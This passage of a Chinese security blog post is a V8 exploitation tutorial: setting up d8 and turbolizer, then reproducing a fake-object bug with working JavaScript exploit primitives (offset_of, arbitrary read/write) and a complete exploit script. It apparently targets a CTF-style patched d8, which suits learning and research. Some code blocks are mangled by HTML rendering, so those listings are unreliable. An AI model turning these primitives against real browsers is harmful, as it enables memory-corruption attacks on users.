<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240713210543.png"></p>
</li>
<li><p>  然后在项目根目录下的 <code>DEPS</code> 文件中查看 <code>V8</code> 版本：</p>
</li>
<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240713210608.png"></p>
</li>
<li><p>  编译 <code>v8</code> ，这里选的 <code>release</code> 版本。<code>debug</code> 版本改为 <code>x64.debug</code> ，32 为版本将 <code>x64</code> 改为 <code>ia32</code> 。如果调试漏洞的话, 最好选择 <code>release</code> 版本 因为 <code>debug</code> 版本可能会有很多检查。</p>
</li>
<li><p>  另外如果出现路径错误需要切换到 <code>./tools/dev/</code> 路径再进行编译。不过这样编译最终生成的 <code>d8</code> 在 <code>tools/dev/out/x64.release</code> 目录下。</p>
</li>
<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240713210728.png"></p>
</li>
<li><p>  编译生成的 <code>d8</code> 在 <code>./out/x64.release/d8</code> 中。</p>
</li>
<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240713210752.png"></p>
</li>
</ol>
<h3 id="调试V8"><a href="#调试V8" class="headerlink" title="调试V8"></a>调试V8</h3><ol>
<li><p>在 <code>~/.gdbinit</code> 添加 <code>v8</code> 的调试插件：</p>
  <pre class="line-numbers language-none"><code class="language-none">source&#96; &#96;&#x2F;path&#x2F;to&#x2F;v8&#x2F;tools&#x2F;gdbinit
source&#96; &#96;&#x2F;path&#x2F;to&#x2F;v8&#x2F;tools&#x2F;gdb-v8-support&#96;&#96;.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li><p>常见参数：</p>
<ul>
<li>  <code>--allow-natives-syntax</code> 开启原生API (用的比较多)</li>
<li>  <code>--trace-turbo</code> 跟踪生成TurboFan IR</li>
<li>  <code>--print-bytecode</code> 打印生成的bytecode</li>
<li>  <code>--shell</code> 运行脚本后切入交互模式</li>
<li>  更多参数可以参考 <code>--help</code></li>
</ul>
</li>
<li><p>调试 js 脚本时可以采用如下命令：</p>
  <pre class="line-numbers language-none"><code class="language-none">gdb .&#x2F;d8
r --allow-natives-syntax --shell .&#x2F;exp.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
</ol>
<h3 id="安装-turbolizer"><a href="#安装-turbolizer" class="headerlink" title="安装 turbolizer"></a>安装 turbolizer</h3><ol>
<li><p><code>turbolizer</code> 是一个可视化分析 JS 优化的工具，安装命令如下：</p>
  <pre class="line-numbers language-none"><code class="language-none">sudo apt install npm
cd &#x2F;path&#x2F;to&#x2F;v8&#x2F;tools&#x2F;turbolizer
sudo npm install n -g
sudo n 16.20.0 # sudo n latest
sudo npm i
sudo npm run-script build<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>  由于 Ubuntu18.04 默认的 <code>node</code> 版本过低，需要安装 <code>16.20.0</code> 版本</p>
</li>
<li><p>最后需要启动一个 web 服务器，根据需要 8000 可以换成其它端口</p>
  <pre class="line-numbers language-none"><code class="language-none">python -m SimpleHTTPServer 8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>编写一个 js 脚本：<br>  <code>%OptimizeFunctionOnNextCall</code> 内置函数可以直接触发强行触发优化。</p>
  <pre class="line-numbers language-none"><code class="language-none">function add(a, b) &#123;
    return a + b;
&#125;
 
&#x2F;&#x2F;%OptimizeFunctionOnNextCall(add);
for (let i &#x3D; 0; i &lt; 10000000; i++) &#123;
    add(i, i + 1);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>运行 js 脚本并使用 <code>--trace-turbo</code> 参数</p>
  <pre class="line-numbers language-none"><code class="language-none">.&#96;&#96;&#x2F;d8&#96; &#96;--trace-turbo --allow-natives-syntax .&#96;&#96;&#x2F;test&#96;&#96;.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>此时会生成如下文件：</p>
<p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240713211102.png"></p>
</li>
<li><p>在浏览器（<strong>最好使用 Chrome 浏览器，系统自带的火狐浏览器可能有问题。</strong>）中访问 <code>http://127.0.0.1:8000/path/to/v8/tools/turbolizer/</code>（注意，这里的路径是相对于 python 启动的 web 服务的路径的相对路径而不是绝对路径） ，然后在其中打开该文件就可以进行分析。</p>
<p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240713211122.png"></p>
</li>
</ol>
<h2 id="任意地址对象伪造漏洞复现"><a href="#任意地址对象伪造漏洞复现" class="headerlink" title="任意地址对象伪造漏洞复现"></a>任意地址对象伪造漏洞复现</h2><ol>
<li><p>  如果存在任意地址对象伪造漏洞（<code>fake_object</code> 原语），则我们可以在一个大的 <code>DoubleArray</code> 中伪造一个 <code>DoubleArray</code> 然后实现 <code>offset_of</code> ，<code>arbitrary_offset_read</code> ，<code>arbitrary_offset_write</code> 原语。首先我们先创建一个大的 <code>DoubleArray</code> 并在里面伪造一个 <code>DoubleArray</code> 。</p>
</li>
<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240713212232.png"></p>
</li>
<li><p>这里需要注意的是：通过调试可知，我们只需要伪造 <code>map</code> 的前 16 字节即可。而 <code>map</code> 的前 16 字节基本是不变的。</p>
  <pre class="line-numbers language-none"><code class="language-none">let spray_array &#x3D; new Array(0xf700).fill(1.1);
let spray_array_data_offset &#x3D; 0x00202141n + 7n;  &#x2F;&#x2F; spray_array 的 element 中成员的起始地址
let map_offset &#x3D; spray_array_data_offset + 0x1000n;  &#x2F;&#x2F; 伪造的 map 在沙箱中的偏移
let fake_double_array_offset &#x3D; map_offset + 0x1000n;  &#x2F;&#x2F; 伪造的 fake_double_array 在沙箱中的偏移
 
&#x2F;&#x2F; 伪造 fake_double_array 的 map ，这里只需要伪造前 16 字节。
spray_array[(map_offset - spray_array_data_offset) &#x2F; 8n] &#x3D; u2d(0x1a04040400002141n);
spray_array[(map_offset - spray_array_data_offset) &#x2F; 8n + 1n] &#x3D; u2d(0xa0007ff1100083an);
 
&#x2F;&#x2F; fake_double_array 的 map 指针指向伪造的 map
spray_array[(fake_double_array_offset - spray_array_data_offset) &#x2F; 8n] &#x3D; u2d(map_offset | 1n | (0x00002259n &lt;&lt; 32n));
 
&#x2F;&#x2F; 利用任意地址对象伪造漏洞（fake_object）泄露出 fake_double_array
let fake_double_array &#x3D; trigger(fake_double_array_offset | 1n);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="4">
<li><p>  <code>offset_of</code> 原语实现：我们只需要再申请一个大的 <code>ObjectArray</code>（我们称之为 <code>spray_object_array</code>）然后让伪造的 <code>DoubleArray</code> 的 <code>elements</code> 指针指向 <code>spray_object_array</code> 的 <code>elements</code>（<code>elements</code> 在沙箱内偏移固定）造成类型混淆。</p>
</li>
<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240713212340.png"></p>
</li>
<li></li>
<li><pre><code>  let spray_object_array = ``new` `Array(0xf700).fill(&#123;&#125;);
  let object_array_element_offset = 0x00282141n;
  <pre class="line-numbers language-none"><code class="language-none">
           
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
  function` `offset_of(object) &#123;
    ``// 将 object 添加到 spray_object_array 的 elements 中
    ``spray_object_array[0] = object;
    ``// fake_double_array 的 elements 指针指向 spray_object_array 的 elements
    ``spray_array[(fake_double_array_offset - spray_array_data_offset) / 8n + 1n] = u2d(object_array_element_offset | 1n | (0x00000002n &lt;&lt; 32n));
    ``// 从 fake_double_array 读出 object 在沙箱中的偏移
    ``return` `d2u(fake_double_array[0]) &amp; 0xFFFFFFFFn;
  &#125;
  <pre class="line-numbers language-none"><code class="language-none">
8.   &#96;arbitrary_offset_read&#96; 和 &#96;arbitrary_offset_write&#96; 原语实现：直接通过 &#96;apray_array&#96; 修改 &#96;elements&#96; 然后读写 &#96;fake_double_array&#96; 实现。

9.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20240713212409.png)
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
  function arbitrary_offset_read(address) &#123;
      spray_array[(fake_double_array_offset - spray_array_data_offset) / 8n + 1n] = u2d((address - 8n) | 1n | (0x00000002n &lt;&lt; 32n));
      return d2u(fake_double_array[0]);
  &#125;
   
  function arbitrary_offset_write(address, value) &#123;
      spray_array[(fake_double_array_offset - spray_array_data_offset) / 8n + 1n] = u2d((address - 8n) | 1n | (0x00000002n &lt;&lt; 32n));
      fake_double_array[0] = u2d(value);
  <pre class="line-numbers language-none"><code class="language-none">
10.   完整exp
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
   let array_buffer = new ArrayBuffer(0x8);
   let data_view = new DataView(array_buffer);
    
   function d2u(value) &#123;
       data_view.setFloat64(0, value);
       return data_view.getBigUint64(0);
   &#125;
    
   function u2d(value) &#123;
       data_view.setBigUint64(0, value);
       return data_view.getFloat64(0);
   &#125;
    
   function hex(val) &#123;
       return &#39;0x&#39; + val.toString(16).padStart(16, &quot;0&quot;);
   &#125;
    
   let oob_array = [.1];
   let object_array = [&#123;&#125;];
   let double_array = [.1];
   let rw_array = [.1];
    
    
   oob_array.len(0x1337);
    
   let object_array_map = d2u(oob_array[8]);
   let double_array_map = d2u(oob_array[12]);
    
   console.log(&quot;[*] object array map: &quot; + hex(object_array_map &amp; 0xFFFFFFFFn));
   console.log(&quot;[*] double array map: &quot; + hex(double_array_map &amp; 0xFFFFFFFFn));
    
   function trigger(offset) &#123;
       oob_array[12] = u2d(double_array_map);
       double_array[0] = u2d(offset);
       oob_array[12] = u2d((object_array_map &amp; 0xFFFFFFFFn) | (double_array_map &amp; 0xFFFFFFFF00000000n));
       return double_array[0];
   &#125;
    
   let spray_array = new Array(0xf700).fill(1.1);
   let spray_array_data_offset = 0x00202141n + 7n;
   let map_offset = spray_array_data_offset + 0x1000n;
   let fake_double_array_offset = map_offset + 0x1000n;
    
   spray_array[(map_offset - spray_array_data_offset) / 8n] = u2d(0x1a04040400002141n);
   spray_array[(map_offset - spray_array_data_offset) / 8n + 1n] = u2d(0xa0007ff1100083an);
   spray_array[(fake_double_array_offset - spray_array_data_offset) / 8n] = u2d(map_offset | 1n | (0x00002259n &lt;&lt; 32n));;
   let fake_double_array = trigger(fake_double_array_offset | 1n);
    
    
   let spray_object_array = new Array(0xf700).fill(&#123;&#125;);
   let object_array_element_offset = 0x00282141n;
    
    
   function offset_of(object) &#123;
       spray_object_array[0] = object;
       spray_array[(fake_double_array_offset - spray_array_data_offset) / 8n + 1n] = u2d(object_array_element_offset | 1n | (0x00000002n &lt;&lt; 32n));
       return d2u(fake_double_array[0]) &amp; 0xFFFFFFFFn;
   &#125;
    
   function arbitrary_offset_read(address) &#123;
       spray_array[(fake_double_array_offset - spray_array_data_offset) / 8n + 1n] = u2d((address - 8n) | 1n | (0x00000002n &lt;&lt; 32n));
       return d2u(fake_double_array[0]);
   &#125;
    
   function arbitrary_offset_write(address, value) &#123;
       spray_array[(fake_double_array_offset - spray_array_data_offset) / 8n + 1n] = u2d((address - 8n) | 1n | (0x00000002n &lt;&lt; 32n));
       fake_double_array[0] = u2d(value);
   &#125;
    
   let a = [1, 2, 3, 4];
    
   % DebugPrint(a);
    
   arbitrary_offset_write(offset_of(a), 0xdeadbeefn);
    
    
   // % DebugPrint(oob_array);
   // console.log(hex(offset_of(oob_array)));
    
   % SystemBreak();
</code></pre>
</li>
<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240713212650.png"></p>
</li>
</ol>
</li>
</ol>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://dezhoutorizhao.github.io">h3110w0r1d</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://dezhoutorizhao.github.io/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8V8/">http://dezhoutorizhao.github.io/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8V8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://dezhoutorizhao.github.io" target="_blank">h3110w0r1d's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/Docker+K8s/" title="云原生实战-Docker+K8s"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">云原生实战-Docker+K8s</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">h3110w0r1d</div><div class="author-info__description">曲师大CTF实验室负责人、DebuGGer战队领队，研究：Web安全、渗透测试、多线程高并发、分布式计算、云计算</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">101</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">64</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao?tab=repositories"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">h3110w0r1d师傅又发布了新博客了，快去看看他学了什么新技术吧</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Suricata%E9%80%9A%E8%BF%87%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98%E8%8E%B7%E5%8F%96%E6%B5%81%E9%87%8F"><span class="toc-number">1.</span> <span class="toc-text">Suricata通过共享内存获取流量</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Suricata%E5%AE%89%E8%A3%85"><span class="toc-number">1.2.</span> <span class="toc-text">Suricata安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Suricata%E9%85%8D%E7%BD%AE"><span class="toc-number">1.3.</span> <span class="toc-text">Suricata配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E5%89%8D%E7%9A%84%E6%B5%8B%E8%AF%95"><span class="toc-number">1.4.</span> <span class="toc-text">运行前的测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Suricata%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F"><span class="toc-number">1.5.</span> <span class="toc-text">Suricata运行模式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IDS%EF%BC%88%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%EF%BC%89%E6%A8%A1%E5%BC%8F"><span class="toc-number">1.5.1.</span> <span class="toc-text">IDS（入侵检测系统）模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IPS%EF%BC%88%E5%85%A5%E4%BE%B5%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9F%EF%BC%89%E6%A8%A1%E5%BC%8F"><span class="toc-number">1.5.2.</span> <span class="toc-text">IPS（入侵防御系统）模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E7%9A%84%E5%88%86%E9%85%8D"><span class="toc-number">1.5.3.</span> <span class="toc-text">流的分配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E7%9A%84%E9%98%9F%E5%88%97"><span class="toc-number">1.5.4.</span> <span class="toc-text">流的队列</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#spare%E9%98%9F%E5%88%97"><span class="toc-number">1.5.4.1.</span> <span class="toc-text">spare队列</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A5%E9%98%9F"><span class="toc-number">1.5.4.2.</span> <span class="toc-text">入队</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BA%E9%98%9F"><span class="toc-number">1.5.4.3.</span> <span class="toc-text">出队</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#recycle%E9%98%9F%E5%88%97"><span class="toc-number">1.5.5.</span> <span class="toc-text">recycle队列</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A5%E9%98%9F-1"><span class="toc-number">1.5.5.1.</span> <span class="toc-text">入队</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BA%E9%98%9F-1"><span class="toc-number">1.5.5.2.</span> <span class="toc-text">出队</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0-Suricata-%E4%BB%8E%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98%E4%B8%AD%E8%AF%BB%E5%8F%96%E6%B5%81%E9%87%8F%E6%95%B0%E6%8D%AE%E7%9A%84-demo"><span class="toc-number">1.6.</span> <span class="toc-text">实现 Suricata 从共享内存中读取流量数据的 demo</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E6%96%B0%E6%8A%93%E5%8C%85%E9%A9%B1%E5%8A%A8"><span class="toc-number">1.6.1.</span> <span class="toc-text">添加新抓包驱动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%EF%BC%8C%E5%9C%A8-tm-threads-c-%E6%96%87%E4%BB%B6%E4%B8%AD%E6%B3%A8%E5%86%8C%E6%96%B0%E7%9A%84%E6%8A%93%E5%8C%85%E9%A9%B1%E5%8A%A8%EF%BC%9A"><span class="toc-number">1.6.2.</span> <span class="toc-text">然后，在 tm-threads.c 文件中注册新的抓包驱动：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E6%96%B0%E7%9A%84%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F"><span class="toc-number">1.6.3.</span> <span class="toc-text">添加新的运行模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9-ThreadVars-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="toc-number">1.6.4.</span> <span class="toc-text">修改 ThreadVars 数据结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E4%BB%8E%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98%E8%AF%BB%E5%8F%96%E6%B5%81%E9%87%8F%E6%95%B0%E6%8D%AE%E7%9A%84-demo"><span class="toc-number">1.6.5.</span> <span class="toc-text">实现从共享内存读取流量数据的 demo</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8V8"><span class="toc-number">2.</span> <span class="toc-text">Pwn-浏览器内核V8</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#V8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.1.</span> <span class="toc-text">V8环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91V8"><span class="toc-number">2.1.1.</span> <span class="toc-text">编译V8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95V8"><span class="toc-number">2.1.2.</span> <span class="toc-text">调试V8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-turbolizer"><span class="toc-number">2.1.3.</span> <span class="toc-text">安装 turbolizer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%AF%B9%E8%B1%A1%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.2.</span> <span class="toc-text">任意地址对象伪造漏洞复现</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8V8/" title="Suricata通过共享内存获取流量+pwn-浏览器内核V8">Suricata通过共享内存获取流量+pwn-浏览器内核V8</a><time datetime="2024-07-13T12:56:47.918Z" title="发表于 2024-07-13 20:56:47">2024-07-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/Docker+K8s/" title="云原生实战-Docker+K8s">云原生实战-Docker+K8s</a><time datetime="2024-04-10T12:40:41.235Z" title="发表于 2024-04-10 20:40:41">2024-04-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0/" title="计算机网络复习">计算机网络复习</a><time datetime="2024-04-01T12:39:28.311Z" title="发表于 2024-04-01 20:39:28">2024-04-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/Metasploit%E5%AE%9E%E6%88%98/" title="Metasploit实战">Metasploit实战</a><time datetime="2024-03-19T08:19:14.901Z" title="发表于 2024-03-19 16:19:14">2024-03-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023%E5%A4%8D%E7%9B%98/" title="2023复盘">2023复盘</a><time datetime="2024-01-10T16:41:46.332Z" title="发表于 2024-01-11 00:41:46">2024-01-11</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2024 By h3110w0r1d</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">成功的秘诀在于兴趣</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async="async"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener
  btf.removeGlobalFnEvent('pjax')
  btf.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>